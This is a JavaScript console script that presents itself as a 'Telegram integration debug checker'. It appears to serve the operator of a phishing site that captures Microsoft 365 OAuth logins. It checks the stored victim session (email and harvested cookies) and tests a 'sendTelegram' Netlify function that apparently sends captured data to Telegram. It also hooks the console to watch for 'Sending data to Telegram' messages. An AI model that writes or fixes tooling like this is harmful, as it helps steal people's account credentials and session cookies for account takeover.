// 🔍 TELEGRAM INTEGRATION DEBUG CHECKER
// Copy and paste this entire script into your browser console on your deployed site

console.log('%c🔍 TELEGRAM DEBUG CHECKER STARTED', 'background: #000; color: #00ff00; font-size: 16px; padding: 5px;');
console.log('=====================================\n');

// 1. Check current environment
const currentURL = window.location.href;
const expectedDomain = 'vaultydocs.com';
const actualDomain = new URL(currentURL).hostname;

console.log('1. 🌐 DOMAIN CHECK:');
console.log(`   Current domain: ${actualDomain}`);
console.log(`   Expected domain: ${expectedDomain}`);

if (actualDomain === expectedDomain) {
    console.log('%c   ✅ Domain matches!', 'color: #00ff00');
} else {
    console.log('%c   ❌ DOMAIN MISMATCH! This is likely the problem.', 'color: #ff4444');
    console.log('%c   💡 Update REDIRECT_URI in RealOAuthRedirect.tsx', 'color: #ffaa44');
}

// 2. Check OAuth parameters
const urlParams = new URLSearchParams(window.location.search);
const hasCode = urlParams.get('code');
const hasState = urlParams.get('state');
const hasError = urlParams.get('error');

console.log('\n2. 🔄 OAUTH PARAMETERS:');
if (hasCode) {
    console.log(`%c   ✅ OAuth code: ${hasCode.substring(0, 20)}...`, 'color: #00ff00');
} else {
    console.log('%c   ❌ No OAuth code found', 'color: #ff4444');
}

if (hasState) {
    console.log(`%c   ✅ OAuth state: ${hasState}`, 'color: #00ff00');
} else {
    console.log('%c   ❌ No OAuth state found', 'color: #ff4444');
}

if (hasError) {
    console.log(`%c   ❌ OAuth error: ${hasError}`, 'color: #ff4444');
}

// 3. Check localStorage for OAuth state
const storedState = localStorage.getItem('oauth_state');
console.log('\n3. 💾 STORED STATE:');
if (storedState) {
    console.log(`%c   ✅ Stored state: ${storedState}`, 'color: #00ff00');
    if (hasState && hasState === storedState) {
        console.log('%c   ✅ State matches!', 'color: #00ff00');
    } else if (hasState) {
        console.log('%c   ❌ State mismatch!', 'color: #ff4444');
    }
} else {
    console.log('%c   ❌ No stored state found', 'color: #ff4444');
}

// 4. Test function accessibility
console.log('\n4. 🔧 FUNCTION TEST:');
async function testFunction() {
    try {
        const response = await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ test: true })
        });
        
        console.log(`%c   ✅ Function accessible (${response.status})`, 'color: #00ff00');
        
        if (response.ok) {
            const data = await response.json();
            console.log('   Response:', data);
        } else {
            const errorText = await response.text();
            console.log('%c   ⚠️ Function error:', 'color: #ffaa44', errorText);
        }
    } catch (error) {
        console.log('%c   ❌ Function not accessible:', 'color: #ff4444', error.message);
    }
}

// 5. Monitor for OAuth callback execution
console.log('\n5. 📡 MONITORING OAUTH CALLBACK:');
if (hasCode && hasState) {
    console.log('%c   OAuth parameters detected - monitoring for callback execution...', 'color: #4444ff');
    
    // Hook into console to catch OAuth messages
    const originalLog = console.log;
    console.log = function(...args) {
        const message = args.join(' ');
        if (message.includes('OAuth callback handling') || 
            message.includes('Step 2: Sending data to Telegram') ||
            message.includes('Step 2 completed')) {
            console.log('%c   🎯 OAUTH MESSAGE:', 'color: #00ff00; font-weight: bold;', message);
        }
        originalLog.apply(console, args);
    };
    
    console.log('%c   Console monitoring active - attempt login to see OAuth messages', 'color: #4444ff');
} else {
    console.log('%c   No OAuth parameters - need to complete login first', 'color: #ffaa44');
}

// 6. Test session data
console.log('\n6. 💾 SESSION DATA CHECK:');
const sessionData = localStorage.getItem('microsoft365_session');
if (sessionData) {
    try {
        const parsed = JSON.parse(sessionData);
        console.log('%c   ✅ Session data found:', 'color: #00ff00');
        console.log('   Email:', parsed.email);
        console.log('   Cookies:', parsed.formattedCookies?.length || 0);
    } catch (e) {
        console.log('%c   ⚠️ Session data corrupted', 'color: #ffaa44');
    }
} else {
    console.log('%c   ❌ No session data found', 'color: #ff4444');
}

// Run function test
testFunction();

// 7. Final diagnosis
console.log('\n🎯 DIAGNOSIS SUMMARY:');
console.log('=====================================');

if (actualDomain !== expectedDomain) {
    console.log('%c❌ PRIMARY ISSUE: Domain mismatch', 'color: #ff4444; font-size: 14px; font-weight: bold;');
    console.log('%c💡 SOLUTION: Update REDIRECT_URI in your code to match actual domain', 'color: #ffaa44');
} else if (!hasCode && !hasState) {
    console.log('%c❌ PRIMARY ISSUE: OAuth flow not started/completed', 'color: #ff4444; font-size: 14px; font-weight: bold;');
    console.log('%c💡 SOLUTION: Complete the login process first', 'color: #ffaa44');
} else {
    console.log('%c✅ OAuth flow looks good - check network requests during login', 'color: #00ff00; font-size: 14px; font-weight: bold;');
}

console.log('\n📱 NEXT STEPS:');
console.log('1. If domain mismatch: Update code and redeploy');
console.log('2. If no OAuth params: Complete login process');
console.log('3. If all good: Check Network tab during login for sendTelegram requests');
console.log('4. Check Netlify environment variables');